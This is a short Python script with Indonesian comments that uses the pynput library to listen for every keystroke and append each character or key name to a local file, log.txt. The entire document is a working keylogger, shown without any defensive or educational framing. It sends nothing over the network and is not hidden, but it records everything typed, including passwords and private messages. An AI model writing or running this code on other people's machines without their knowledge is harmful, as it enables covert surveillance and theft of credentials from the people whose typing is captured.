from pynput import keyboard

# Fungsi ini akan dipanggil ketika tombol keyboard ditekan
def on_press(key):
    try:
        # Menulis karakter ke file log.txt
        with open("log.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Jika bukan karakter, tulis namanya ke file log.txt
        with open("log.txt", "a") as f:
            f.write(str(key))

# Membuat listener untuk menangkap setiap tombol yang ditekan
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
